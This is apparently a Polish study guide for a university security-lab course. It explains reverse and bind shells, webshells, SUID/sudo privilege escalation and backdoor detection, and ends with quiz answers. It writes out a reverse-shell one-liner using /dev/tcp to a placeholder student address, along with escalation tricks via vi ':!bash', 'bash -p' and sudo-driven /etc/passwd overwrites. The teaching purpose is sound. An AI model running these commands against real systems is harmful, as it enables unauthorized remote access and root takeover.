Nie uruchomisz skutecznie dwóch serwerów na tym samym zajętym adresie i porcie w ten sam sposób. Dlatego przed Apache na porcie 80 zatrzymujesz serwer Pythona. Dla portów uprzywilejowanych mogą być potrzebne odpowiednie prawa; sam brak uprawnień nie świadczy o awarii sieci.

### Łańcuch PENTEST 5 - skąd bierze się dostęp?

1. Przenosisz statyczny Nmap na host ćwiczeniowy bez Internetu.
2. Skanujesz cel dostępny w sieci wewnętrznej i znajdujesz usługę WWW.
3. Listing ujawnia pliki katalogu domowego, w tym parę kluczy SSH.
4. Odczytujesz wskazówkę o właścicielu z klucza publicznego, ograniczasz prawa do prywatnego klucza i używasz go do SSH.
5. Sprawdzasz sudo; zbyt szerokie uprawnienia pozwalają przejść na root i odczytać flagę.

Komentarz klucza publicznego jest wskazówką, nie kryptograficznym dowodem nazwy konta. Różne wersje materiałów podają różne nazwy użytkownika. Najważniejsza przyczyna dostępu to **ujawnienie klucza prywatnego i brak wystarczającego ograniczenia uprawnień konta**.

Suma SHA-1 w zadaniach służy porównaniu plików i wykryciu niezgodności. Zgodność z sumą otrzymaną z zaufanego źródła jest bardziej znacząca niż zgodność z wartością podaną przez potencjalnie zmodyfikowaną maszynę. Sama suma nie mówi, kto i dlaczego stworzył plik.

## 6. Reverse shell, bind shell i webshell

Podstawa: **PDF 6, s. 11-19 i 21-35; PDF 6p, s. 10-17**.

### Najważniejsza zasada: gdzie działa powłoka?

W obu technikach powłoka uruchamia się **na celu**, a student zdalnie podaje jej komendy. Różnica dotyczy strony inicjującej połączenie.

**Reverse shell:** student nasłuchuje, a cel inicjuje połączenie do studenta.

```text
Cel z powłoką  →  Student z nasłuchem
```

**Bind shell:** cel nasłuchuje, a student inicjuje połączenie do celu.

```text
Student  →  Cel z nasłuchem i powłoką
```

Nazwy klient i serwer w tym kontekście opisują role sieciowe. Cel może być klientem sieciowym w reverse shellu, mimo że cały czas jest maszyną, na której wykonujesz polecenia.

**Samo połączenie Netcatem nie jest jeszcze powłoką.** W zadaniach 6.1 i 6.5 zestawiasz kanał; dopiero podłączenie procesu Bash do tego kanału daje wykonywanie komend.

### W jakiej kolejności działać?

Najpierw uruchamiasz nasłuch, potem stronę łączącą. W reverse shellu podajesz **adres studenta widoczny przez VPN**, zwykle z `tun0`, a nie jego adres Wi-Fi. W bind shellu podajesz adres celu i jego port nasłuchu.

Zmienna z przykładu `[IP_STUDENTA]` nie jest gotowym adresem. `ip addr show tun0` pokazuje lokalny adres przy `inet`; pole `peer` opisuje drugi koniec i nie jest zamiennikiem Twojego IP.

Reverse shell może działać tam, gdzie ruch wychodzący z celu jest dozwolony, a przychodzący ograniczony. **Nie gwarantuje to obejścia zapory.** Nadal potrzebne są poprawne trasy, dozwolony kierunek ruchu i dostępny port. Bind shell wymaga dotarcia do portu nasłuchującego na celu.

### Netcat, Bash i deskryptory

Netcat przesyła bajty. Jeśli dana wersja obsługuje `-e /bin/bash`, może połączyć te bajty z uruchomioną powłoką. Wersje `nc` różnią się składnią i dostępnymi opcjami, dlatego brak `-e` nie oznacza, że źle wybrano IP.

W przykładzie Bash z 6.3:

```bash
bash -i >& /dev/tcp/ADRES_STUDENTA/12303 0>&1
```

- `bash -i` uruchamia interaktywny Bash na maszynie, na której wpisano polecenie.
- `/dev/tcp/ADRES/PORT` to specjalny mechanizm Basha otwierający połączenie TCP podczas przekierowania.
- `>&` kieruje standardowe wyjście i błędy do połączenia.
- `0>&1` kieruje również standardowe wejście do tego samego kanału.

Wynik to połączenie klawiatury i wyjścia zdalnego procesu ze strumieniem sieciowym. Polecenie działa w Bash z odpowiednim wsparciem tej składni; nie należy traktować `/dev/tcp/...` jako zwykłego pliku na dysku.

### Dlaczego socat daje wygodniejszy terminal?

Zwykły kanał wejścia/wyjścia może nie obsługiwać dobrze strzałek, sygnałów, edytorów czy programów oczekujących terminala. **PTY - pseudoterminal** udostępnia procesowi interfejs zbliżony do prawdziwego terminala.

W przykładach socat:

- `FILE:` z wynikiem `tty` dołącza lokalny terminal;
- `TCP-LISTEN` nasłuchuje, `TCP` lub `tcp-connect` łączy;
- `EXEC:/bin/bash` uruchamia proces na tej stronie, na której zapisano ten argument;
- `pty` dodaje pseudoterminal;
- `stderr` dołącza błędy;
- `setsid`, `sigint`, `sane`, `raw`, `echo=0` pomagają poprawnie połączyć sesję, sygnały i ustawienia terminala;
- `fork` pozwala obsługiwać kolejne połączenia, a `reuseaddr` pomaga ponownie użyć adresu nasłuchu.

PDF pokazuje także poprawę sesji przez Python `pty.spawn`, zawieszenie `Ctrl+Z`, ustawienie lokalnego `stty -echo raw` i powrót przez `fg`. Ustawienia terminala wykonuje się we właściwym miejscu: utworzenie PTY zdalnie i zmiana lokalnego terminala to dwa różne kroki.

**Interaktywność nie oznacza szyfrowania.** Socat z PTY może poprawić obsługę terminala, ale pokazane połączenie TCP nie staje się przez to odpowiednikiem chronionego SSH.

### Webshell i RCE - przejście z WWW do terminala

**RCE** oznacza zdalne wykonanie kodu lub poleceń. **Webshell** jest interfejsem aplikacji WWW pozwalającym wysłać polecenie do wykonania na serwerze. W ćwiczeniu żądanie `curl` przenosi komendę w parametrze URL.

Ważne rozróżnienie: `curl` nie wykonuje automatycznie komendy na dowolnej odwiedzonej stronie. To **konkretny kod aplikacji na serwerze** odbiera wartość parametru i przekazuje ją do wykonania.

W scenariuszu 6p najpierw używasz tekstowej przeglądarki Lynx z maszyny pośredniej. Ujawniony plik historii lub plik tymczasowy pokazuje adres webshella i nazwę parametru. Następnie potwierdzasz wykonanie polecenia, uruchamiasz bind shell i łączysz się z drugiego terminala. Pierwsze żądanie może pozostać aktywne, dopóki działa uruchomiony proces.

Kodowanie `%20` i `+` dotyczy sposobu przekazania spacji. Nie usuwa niebezpieczeństwa, jeśli aplikacja bez właściwych ograniczeń wykonuje otrzymany tekst.

### Zabezpieczenia SSH wspomniane w materiałach

Rozpoznawaj sens ustawień: `PermitRootLogin no` ogranicza bezpośrednie logowanie jako root, `AllowUsers` zawęża konta dopuszczone do SSH, a `PasswordAuthentication no` wyłącza metodę logowania hasłem w tym ustawieniu. Przy korzystaniu z kluczy nadal trzeba chronić klucz prywatny i poprawnie weryfikować host.

Zmiana portu SSH może ograniczyć część przypadkowych prób, lecz enumeracja nadal może znaleźć usługę. To nie zastępuje właściwego uwierzytelniania i kontroli dostępu.

## 7. Tylne furtki i eskalacja uprawnień

Podstawa: **PDF 7, s. 10-12 i 14-46; PDF 7p, s. 10-20**.

### Backdoor, błędna konfiguracja i eskalacja

**Backdoor** to droga dostępu omijająca normalną kontrolę, często pozostawiona celowo. **Błędna konfiguracja** może stworzyć podobną możliwość bez celowego działania. **Eskalacja uprawnień** to przejście z ograniczonego kontekstu do szerszych uprawnień, np. zwykły użytkownik → root.

Nie każda droga eskalacji jest luką w kodzie programu. W tych ćwiczeniach często wystarczają prawa plików, nieprawidłowe reguły sudo, konto z UID 0 albo pozostawiona powłoka sieciowa.

Po uzyskaniu dostępu najpierw ustal konto i uprawnienia przez `id`, a następnie zbadaj reguły sudo, pliki specjalne, konta, procesy i nasłuchy. Końcowy `/root/solve` jest mechanizmem zaliczania laboratorium, nie uniwersalnym elementem Linuxa.

### linPEAS i granice automatyzacji

linPEAS zbiera dane i wyróżnia potencjalnie interesujące konfiguracje. Pomaga szybko zobaczyć wiele obszarów, ale wynik nie jest gotowym werdyktem.

- **False positive:** zgłoszenie wygląda na słabość, ale w danych warunkach nie daje zakładanej możliwości.
- **False negative:** narzędzie nie wskazuje rzeczywistego problemu.
- Dobrze zabezpieczona maszyna może mieć liczne wyróżnienia w raporcie.
- Wyniki trzeba odnieść do uprawnień, wersji, właścicieli, reguł i rzeczywistego działania.

W zadaniu 7.2 narzędzie uruchamiasz na systemie, który ma pokazać właśnie takie ograniczenia analizy automatycznej. Ręczne sprawdzenie jest potrzebne także wtedy, gdy linPEAS niczego oczywistego nie wykryje.

### SUID i SGID - skąd biorą się wyższe uprawnienia?

Przy uruchomieniu pliku wykonywalnego z **SUID** system może nadać procesowi efektywny UID właściciela pliku. Jeśli właścicielem jest root, proces może działać z efektywnym UID 0. **SGID** odnosi się analogicznie do efektywnej grupy. To mechanizmy uprawnień, nie automatycznie backdoory; legalne programy również ich używają.

W `ls -l` specjalny znak `s` pojawia się w pozycji wykonywania właściciela lub grupy. Liczbowo SUID to `4000`, SGID `2000`. Polecenie z zajęć:

```bash
find / -type f -perm /6000 2>/dev/null
```

W GNU find zapis `/6000` oznacza, że ustawiony jest **co najmniej jeden** ze wskazanych bitów. To wyszukiwanie SUID **lub** SGID, a nie wymaganie obu jednocześnie.

Znaleziona powłoka z SUID nie musi zachowywać uprawnień przy zwykłym uruchomieniu. W scenariuszu Bash używa się `bash -p`, aby je zachować. **Samo dodanie `-p` do zwykłego Basha nie podnosi uprawnień.** Musi istnieć odpowiedni kontekst efektywnego UID, a działanie może być ograniczone konfiguracją systemu.

### Baseline i integralność programów

System0 jest **czystym punktem odniesienia**. Porównanie z nim pomaga znaleźć różnice, które nie rzucają się w oczy po samej nazwie pliku.

W 7.4-7.7 furtka może być:

- ukrytym plikiem w katalogu domowym;
- programem w nietypowym miejscu;
- zwykłą powłoką z niebezpiecznym SUID;
- podmienionym programem o normalnie wyglądającej nazwie.

Dlatego sprawdzasz lokalizację, właściciela, uprawnienia i zawartość lub sumę. `sha1sum` pozwala porównać bajty z baseline. **Inna suma nie oznacza automatycznie ataku:** aktualizacja pakietu także zmienia plik. Porównanie ma sens przy zgodnych wersjach i zaufanym systemie odniesienia.

Nazwa `chfn` w Twoim rozwiązaniu jest konkretnym przykładem podmienionej binarki. Nie należy wyciągać wniosku, że standardowy `chfn` na każdym Linuxie otwiera root shell.

### Sudo i GTFOBins - liczą się możliwości programu

`sudo -l` pokazuje, jakie programy, jako kto i na jakich warunkach może wykonać bieżące konto. Samo członkostwo w grupie albo posiadanie sudo nie mówi jeszcze, co dokładnie jest dozwolone.

Jeżeli przez sudo można uruchomić **interpreter**, np. Perl lub Python, jego kod może wykonywać inne programy w uzyskanym kontekście. Jeżeli dozwolony **edytor** obsługuje uruchamianie poleceń zewnętrznych, np. `:!bash` w vi, jego funkcje mogą wyjść poza edycję jednego pliku.

GTFOBins opisuje takie możliwości zwykłych narzędzi w określonych warunkach, m.in. sudo i SUID. Obecność programu na liście nie dowodzi podatności jego każdej instalacji. Musi istnieć pasująca reguła uprawnień i działająca funkcja.

**Najważniejszy wniosek:** pozwolenie na uruchomienie programu jako root oznacza dopuszczenie jego rzeczywistych możliwości, nie tylko jednej zamierzonej przez administratora czynności.

### Nadpisywanie plików jako droga do eskalacji

W 7.11 zwykłe konto może przygotować kopię `passwd`, lecz nie może samo zapisać jej jako `/etc/passwd`. Dopiero reguła sudo do narzędzia zapisującego pliki daje brakującą możliwość.

Repozytorium wykorzystuje `wget` z lokalnym serwerem HTTP, a PDF - `curl` z `file://`. W obu wariantach mechanizm jest ten sam: **program uruchomiony z wyższymi uprawnieniami zapisuje kontrolowaną treść do chronionego pliku**. Powodzenie zależy od konkretnej reguły sudo i dopuszczonych argumentów.

W `wget` duże `-O` wskazuje plik pobranej treści, a małe `-o` dziennik. Ta różnica jest krytyczna dla zrozumienia scenariusza. Zmiana pola hasła w pliku systemowym jest częścią odtwarzalnego laboratorium; nie jest zwykłą metodą administracji kontami.

### Konta UID 0 i lokalne powłoki sieciowe

W 7.10 dodatkowe konto z UID 0 ma znaczenie roota niezależnie od nazwy. Puste hasło w konfiguracji zadania umożliwia przejście na to konto; nie należy generalizować tego na wszystkie konfiguracje uwierzytelniania.

W 7.12 furtką jest proces nasłuchujący, połączony z powłoką działającą jako root. `ss -tlpn` pomaga znaleźć adres i port, a `ps aux` - proces i użytkownika. Połączenie do niego trzeba wykonać w maszynie, na której dany loopback istnieje.

**Loopback nie oznacza, że problem jest nieistotny.** Usługa dostępna tylko na `127.x.x.x` może być niedostępna bezpośrednio z sieci, ale osiągalna dla lokalnego konta, które uzyskało już sesję. To może wystarczyć do eskalacji.

W 7p łączysz te umiejętności: przeniesienie Nmap → wykrycie bind shella → przeniesienie linPEAS z hosta pośredniego → analiza → przejście na root. Repozytorium wykorzystuje puste hasło; PDF pokazuje inną regułę sudo. Przed wyborem metody trzeba odczytać faktyczną konfigurację.

## Pułapki, które warto umieć wyjaśnić

1. **Port 23 nie dowodzi Telnetu.** Usługę identyfikuje odpowiedź protokołu, nie sam numer.
2. **`-A` nie skanuje automatycznie wszystkich portów.** Zakres ustala się osobno.
3. **`-sn` i `-Pn` nie są przeciwstawnymi zapisami tego samego skanu.** Pierwszy wyłącza skan portów, drugi pomija host discovery.
4. **`open` nie oznacza podatności.** Potwierdza dostępny punkt komunikacji.
5. **`filtered` nie oznacza wyłączonego hosta.** Skaner nie ma rozstrzygającego wyniku dla portu.
6. **Base64 nie chroni sekretu.** Nie potrzebuje klucza do odkodowania.
7. **POST nie szyfruje formularza.** Poufność transportu daje np. TLS.
8. **Ciasteczko `admin=true` nie powinno samo nadawać praw.** Klient kontroluje wysyłane dane.
9. **Brak przycisku lub linku nie blokuje żądania.** Repeater i własny URL omijają ograniczenia interfejsu.
10. **Vhost to nie katalog.** Zmieniasz nazwę hosta, a nie tylko ścieżkę.
11. **`/etc/hosts` nie zmienia publicznego DNS.** To lokalne mapowanie.
12. **`-k` nie wyłącza szyfrowania.** Pomija sprawdzenie certyfikatu.
13. **Listen nie oznacza pobierania.** Nasłuchująca strona może wysyłać dane.
14. **TCP nie oznacza poufności.** Niezawodność i szyfrowanie to różne własności.
15. **Reverse shell i bind shell mają powłokę na celu.** Zmienia się kierunek inicjowania połączenia.
16. **PTY nie dodaje automatycznie TLS.** Wygoda terminala i ochrona transmisji są niezależne.
17. **`bash -p` nie tworzy uprawnień roota.** Może zachować już uzyskany efektywny UID.
18. **Każde konto z UID 0 jest uprzywilejowane.** Nazwa `backup` tego nie zmienia.
19. **linPEAS wskazuje tropy.** Raport wymaga ręcznego potwierdzenia.
20. **Inna suma pliku nie wystarcza do stwierdzenia backdoora.** Porównaj wersje i pochodzenie.

## Pytania kontrolne z odpowiedziami

Spróbuj odpowiedzieć przed rozwinięciem. Pytania sprawdzają materiał źródłowy; nie są deklaracją tego, co pojawi się na kolokwium.

### Linux i SSH

<details>
<summary>1. Chcesz sprawdzić dystrybucję, RAM, wolny dysk i aktualne procesy. Jak dobierzesz polecenia?</summary>

Dystrybucja: `cat /etc/os-release`. RAM: `free -h`. Miejsce na zamontowanych systemach plików: `df -h`. Procesy: `ps aux` lub odświeżany `top`. `uname -a` przyda się do wersji jądra i architektury.

</details>

<details>
<summary>2. Czym różni się who od odczytu /etc/passwd?</summary>

`who` pokazuje aktualnie zalogowane sesje. `/etc/passwd` opisuje zdefiniowane konta, także usługowe i niezalogowane. To różne zbiory informacji.

</details>

<details>
<summary>3. Dlaczego skrypt crona z prawem zapisu dla innych użytkowników może być groźny?</summary>

Kto może zmienić skrypt, może wpłynąć na komendy wykonane podczas następnego uruchomienia. Jeśli cron działa jako inne, uprzywilejowane konto, treść kontrolowana przez słabsze konto może zostać wykonana z jego prawami.

</details>

<details>
<summary>4. Co daje chmod 600 klucz i dlaczego nie wystarczy sam plik .pub?</summary>

`600` daje właścicielowi odczyt i zapis, pozostałym brak praw. `.pub` jest kluczem publicznym; do udowodnienia posiadania tożsamości potrzebny jest odpowiadający mu klucz prywatny. Serwer musi też dopuścić ten klucz dla wybranego konta.

</details>

<details>
<summary>5. Czym różni się &gt;, &gt;&gt; i potok?</summary>

`>` zapisuje stdout do pliku z nadpisaniem. `>>` dopisuje. `|` przekazuje stdout na stdin kolejnego programu. Domyślnie żaden z tych zapisów nie przekierowuje automatycznie stderr.

</details>

### Enumeracja i WWW

<details>
<summary>6. Jak znaleźć hosty bez portów, a jak sprawdzić wersje usług?</summary>

`nmap -sn ZAKRES` wykonuje host discovery bez skanu portów. `nmap -sV CEL` dodaje rozpoznawanie usług i wersji. W razie potrzeby `-p-` rozszerza zakres portów TCP, a `-Pn` pomija wstępne host discovery.

</details>

<details>
<summary>7. Nmap wypisuje 23/tcp open telnet. Czy można już wykluczyć SSH?</summary>

Nie. Nazwa mogła zostać dobrana z typowego przypisania portu. Trzeba wykryć protokół, np. przez `-sV`. W ćwiczeniu SSH działa właśnie na nietypowym porcie.

</details>

<details>
<summary>8. Dlaczego strona „wisi” po włączeniu Burp Intercept?</summary>

Żądanie mogło zostać zatrzymane do ręcznej decyzji. Sprawdź kolejkę Intercept i wybierz Forward albo wyłącz przechwytywanie, gdy nie jest potrzebne. Nie musi to być awaria serwera.

</details>

<details>
<summary>9. Repeater czy Intruder: zmiana jednego ciasteczka, a potem test ID 1-50?</summary>

Do ręcznego porównania `false` i `true` wybierz Repeater. Do przejścia po ID użyj Intrudera, oznacz tylko identyfikator i ustaw Numbers 1-50 z krokiem 1. Oceń odpowiedzi, nie tylko fakt ich otrzymania.

</details>

<details>
<summary>10. Czy przekierowanie na login gwarantuje, że serwer nie ujawnił danych?</summary>

Nie. Sprawdź surową odpowiedź i poprzednie elementy łańcucha przekierowań. Jeśli dane wysłano przed przekierowaniem, samo przejście przeglądarki na login ich nie cofa.

</details>

<details>
<summary>11. Jak odróżnisz słownik katalogów od enumeracji vhostów?</summary>

Przy katalogach zmieniasz ścieżkę zasobu. Przy vhostach zmieniasz nazwę hosta obsługiwaną przez ten sam serwer, np. nagłówek Host. Może to wymagać lokalnego przypisania nazwy do IP.

</details>

<details>
<summary>12. Każdy losowy URL daje 200 i ten sam tekst. Jak uniknąć tysięcy fałszywych trafień?</summary>

Najpierw poznaj typową odpowiedź dla nieistniejącego zasobu. Następnie filtruj jej cechy, np. długość, i porównuj treść, status oraz przekierowania. Nie kopiuj ślepo rozmiaru z innej instancji.

</details>

<details>
<summary>13. Czy hasło zapisane w Base64 albo ukryte w JavaScript jest bezpieczne?</summary>

Nie. Base64 da się odkodować bez sekretnego klucza, a kod wysłany do klienta można przeanalizować. Obfuskacja może utrudnić czytanie, ale nie zastępuje kontroli dostępu.

</details>

### Protokoły i powłoki

<details>
<summary>14. Dlaczego plik po UDP może być uszkodzony, choć dotarły jakieś dane?</summary>

UDP nie zapewnia sam retransmisji i kolejności datagramów. Prosty transfer z ćwiczenia nie uzupełnia braków. Sprawdź rozmiar i sumę pliku, a nie tylko jego istnienie.

</details>

<details>
<summary>15. Czy serwer Netcat listen zawsze pobiera dane od klienta?</summary>

Nie. Listen opisuje nasłuch, nie kierunek pliku. Serwer może po przyjęciu kontaktu wysłać dane dostarczone na stdin albo odebrać je i zapisać przez stdout.

</details>

<details>
<summary>16. Na celu uruchomiono nc z adresem studenta i -e /bin/bash. Która to powłoka?</summary>

Jeżeli cel inicjuje połączenie do nasłuchującego studenta, to reverse shell. Bash działa na celu. Student jest serwerem w sensie nasłuchu, ale zdalnie steruje procesem celu.

</details>

<details>
<summary>17. Dlaczego reverse shell z adresem Wi-Fi studenta może nie działać?</summary>

Cel może nie mieć trasy do tej prywatnej sieci. Potrzebny jest adres dostępny z jego perspektywy, w laboratorium zwykle adres interfejsu VPN. Sprawdź też port, nasłuch i filtrację ruchu.

</details>

<details>
<summary>18. Webshell odpowiada na id. Czy to oznacza gotowy interaktywny terminal?</summary>

Nie. To potwierdza wykonanie konkretnego polecenia przez interfejs WWW. Interaktywny terminal wymaga dalszego połączenia strumieni, a wygodna obsługa programów terminalowych zwykle również PTY.

</details>

<details>
<summary>19. Python http.server został uruchomiony w katalogu domowym. Co jest udostępniane?</summary>

Bieżący katalog i dostępne w nim zasoby zgodnie z działaniem serwera i prawami procesu. To może ujawnić dane użytkownika, np. klucze lub historię, jeśli są osiągalne. Wybór katalogu jest częścią konfiguracji bezpieczeństwa.

</details>

<details>
<summary>20. Czy socat z PTY zapewnia takie samo bezpieczeństwo transmisji jak SSH?</summary>

Nie. PTY dotyczy zachowania terminala. Pokazane w ćwiczeniach zwykłe TCP nie dodaje automatycznie szyfrowania ani uwierzytelniania SSH.

</details>

### Eskalacja i wykrywanie furtek

<details>
<summary>21. Co dokładnie wyszukuje find z -perm /6000?</summary>

Pliki z dowolnym ze wskazanych bitów specjalnych: SUID lub SGID. `-type f` ogranicza do zwykłych plików. Wyniki mogą obejmować prawidłowe programy, więc potrzebna jest dalsza analiza.

</details>

<details>
<summary>22. Znaleziono konto backup z UID 0. Czy jest mniej uprzywilejowane niż root?</summary>

Nie z powodu samej nazwy. UID 0 oznacza uprawnienia roota w omawianym modelu. Należy sprawdzić także metody uwierzytelniania i cel istnienia tego konta.

</details>

<details>
<summary>23. Sudo dopuszcza tylko edytor. Dlaczego to może wystarczyć do eskalacji?</summary>

Edytor może oferować zapis dowolnych plików lub uruchamianie programów zewnętrznych. W scenariuszu vi polecenie `:!bash` uruchamia powłokę w kontekście uprawnień edytora. Ograniczenie trzeba oceniać według rzeczywistych funkcji programu i reguły sudo.

</details>

<details>
<summary>24. LinPEAS zaznaczył plik na czerwono, a suma różni się od baseline. Czy dowiedziono ataku?</summary>

Nie. Potrzebna jest ręczna weryfikacja. Zgłoszenie może być false positive, a różnica sum wynikać z aktualizacji lub innej wersji. Porównaj pochodzenie, wersje, uprawnienia i rzeczywiste zachowanie.

</details>

<details>
<summary>25. Dlaczego sudo do pobierania plików może dać więcej niż samo pobieranie?</summary>

Jeżeli użytkownik kontroluje treść źródłową i ścieżkę zapisu, program uruchomiony jako root może nadpisać chroniony plik systemowy. To nadmierna możliwość zapisu wynikająca z reguły sudo, a nie koniecznie luka w samym narzędziu.

</details>

<details>
<summary>26. Podejrzany proces nasłuchuje tylko na loopback. Jakie ma to znaczenie?</summary>

Bezpośredni dostęp z innej maszyny może być niemożliwy. Lokalny użytkownik lub proces działający na tym samym systemie może jednak dosięgnąć portu. Jeśli listener uruchamia root shell, nadal może być drogą lokalnej eskalacji.

</details>

## Plan ostatniej powtórki

Jeśli umiesz odpowiedzieć na poniższe punkty bez zaglądania, masz przećwiczony rdzeń dostarczonych materiałów:

- [ ] Rozróżniam użytkownika, UID, GID i efektywne uprawnienia.
- [ ] Dobieram polecenia do pamięci, dysku, procesów, sieci i wyszukiwania plików.
- [ ] Czytam uprawnienia, przekierowania, potoki i wpis crona.
- [ ] Wyjaśniam rolę klucza prywatnego, publicznego i klucza hosta SSH.
- [ ] Odróżniam host discovery od skanu portów, wersji, skryptów i OS.
- [ ] Wiem, kiedy skan trzeba wykonać z maszyny pośredniej.
- [ ] Potrafię odczytać metodę, ścieżkę, nagłówki, cookies i odpowiedź HTTP.
- [ ] Dobieram HTTP history, Intercept, Repeater, Intruder i Decoder.
- [ ] Rozróżniam kodowanie, obfuskację i kontrolę dostępu.
- [ ] Odróżniam katalog, plik, vhost, subdomenę i parametr.
- [ ] Umiem wyjaśnić dobór słownika oraz fałszywe trafienia enumeracji.
- [ ] Porównuję TCP i UDP oraz connect/listen i upload/download.
- [ ] Rozpoznaję typowe porty i właściwości HTTP, HTTPS, FTP, SMB i SSH.
- [ ] Rysuję kierunek połączenia reverse i bind shell, wskazując miejsce działania powłoki.
- [ ] Wyjaśniam rolę deskryptorów, PTY i ograniczenia prostego Netcata.
- [ ] Rozumiem SUID, SGID, sudo, UID 0 i ryzyko nadpisywania plików.
- [ ] Potwierdzam wyniki linPEAS i porównuję pliki z właściwym baseline.
- [ ] Potrafię opisać przyczynę każdego łańcucha PENTEST, nie tylko odtworzyć komendy.

## Źródła i różnice wersji

Przejrzano wszystkie strony poniższych 14 plików, w tym treść zadań i teorię; wybrane zrzuty interfejsu sprawdzono także wizualnie. Numery stron w rozdziałach odnoszą się do stron PDF, nie numerów zadań. W notatce pominięto powtarzane instrukcje uruchamiania maszyn i ogólne slajdy organizacyjne. Informacje z zadań PENTEST włączono do wyjaśnień mechanizmów.

- **1 - Podstawy systemu Linux, 97 stron:** [PDF podstawowy](https://github.com/M1CH4L9/BSI/blob/main/cw01/1.%20Podstawy%20systemu%20Linux.pdf), [PENTEST - 18 stron](https://github.com/M1CH4L9/BSI/blob/main/cw01/1p.%20Podstawy%20systemu%20Linux%20PENTEST.pdf).
- **2 - Enumeracja usług sieciowych, 27 stron:** [PDF podstawowy](https://github.com/M1CH4L9/BSI/blob/main/cw02/2.%20Enumeracja%20us%C5%82ug%20sieciowych.pdf), [PENTEST - 12 stron](https://github.com/M1CH4L9/BSI/blob/main/cw02/2p.%20Enumeracja%20us%C5%82ug%20sieciowych%20PENTEST.pdf).
- **3 - Bezpieczeństwo Web: wprowadzenie, 40 stron:** [PDF podstawowy](https://github.com/M1CH4L9/BSI/blob/main/cw03/3.%20Bezpiecze%C5%84stwo%20Web_%20Wprowadzenie.pdf), [PENTEST - 17 stron](https://github.com/M1CH4L9/BSI/blob/main/cw03/3p.%20Bezpiecze%C5%84stwo%20Web_%20Wprowadzenie%20PENTEST.pdf).
- **4 - Enumeracja zasobów serwisów WWW, 23 strony:** [PDF podstawowy](https://github.com/M1CH4L9/BSI/blob/main/cw04/4.%20Enumeracja%20zasob%C3%B3w%20serwis%C3%B3w%20WWW.pdf), [PENTEST - 16 stron](https://github.com/M1CH4L9/BSI/blob/main/cw04/4p.%20Enumeracja%20zasob%C3%B3w%20serwis%C3%B3w%20WWW%20PENTEST.pdf).
- **5 - Wstęp do protokołów sieciowych, 61 stron:** [PDF podstawowy](https://github.com/M1CH4L9/BSI/blob/main/cw05/5.%20Wst%C4%99p%20do%20protoko%C5%82%C3%B3w%20sieciowych.pdf), [PENTEST - 19 stron](https://github.com/M1CH4L9/BSI/blob/main/cw05/5p.%20Wst%C4%99p%20do%20protoko%C5%82%C3%B3w%20sieciowych%20PENTEST.pdf).
- **6 - Wykorzystanie zdalnych powłok, 36 stron:** [PDF podstawowy](https://github.com/M1CH4L9/BSI/blob/main/cw06/6.%20Wykorzystanie%20zdalnych%20pow%C5%82ok.pdf), [PENTEST - 18 stron](https://github.com/M1CH4L9/BSI/blob/main/cw06/6p.%20Wykorzystanie%20zdalnych%20pow%C5%82ok%20PENTEST.pdf).
- **7 - Wykrywanie tylnych furtek, 48 stron:** [PDF podstawowy](https://github.com/M1CH4L9/BSI/blob/main/cw07/7.%20Wykrywanie%20tylnych%20furtek.pdf), [PENTEST - 21 stron](https://github.com/M1CH4L9/BSI/blob/main/cw07/7p.%20Wykrywanie%20tylnych%20furtek%20PENTEST.pdf).

**Ważne różnice między materiałami:** repozytorium i PDF-y opisują różne warianty instancji. Dotyczy to adresów i portów, ciasteczka `debug`/`admin`, parametrów formularzy, nazw kluczy i użytkowników, plików z historią, nazw podmienionych programów oraz końcowej eskalacji w 7p. Konkretne różnice oznaczono przy [rozwiązaniach](/przedmioty/bsi/bsi-rozwiazania/). Do nauki najważniejszy jest mechanizm i odczyt bieżącej konfiguracji.

Objaśnienia rozróżnień, np. Base64 a szyfrowanie, transport a TLS, rzeczywiste a efektywne uprawnienia i przyczyny fałszywych trafień, rozwijają materiał dydaktycznie. Nie przepisano uproszczonych opisów incydentów historycznych jako samodzielnie zweryfikowanych faktów; nie są potrzebne do rozwiązania tych ćwiczeń.
